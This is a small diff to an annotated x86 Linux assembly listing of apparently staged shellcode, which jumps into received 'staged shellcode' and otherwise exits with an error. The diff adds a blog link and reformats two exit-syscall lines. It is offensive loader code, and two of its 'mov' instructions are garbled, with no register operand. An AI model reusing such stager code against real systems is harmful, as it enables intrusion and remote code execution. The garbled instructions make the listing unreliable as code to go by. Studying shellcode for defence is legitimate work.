@@ -1,3 +1,4 @@
+; http://jkukunas.blogspot.com/2010/05/x86-linux-networking-system-calls.html
 
 00000000      xor ebx,ebx             ; Clear EBX
 00000002      mul ebx                 ; Clear EAX, EDX
@@ -51,6 +52,6 @@
 00000051      test eax,eax            ; Test for negative return code
 00000053      js 0x57                 ; If negative, jump to exit
 00000055      jmp ecx                 ; If it wasn't, jump to ECX which contains our staged shellcode
-00000057      mo  v   ,0x1             ; SYSCALL(0x1) // man 2 exit
-0000005C      mo  v   ,0x1             ; return code of 1 (error because staged shellcode didn't make it)
+00000057      mo  v   ,0x1            ; SYSCALL(0x1) // man 2 exit
+0000005C      mo  v   ,0x1            ; return code of 1 (error because staged shellcode didn't make it)
 00000061      int 0x80                ; exit(1)
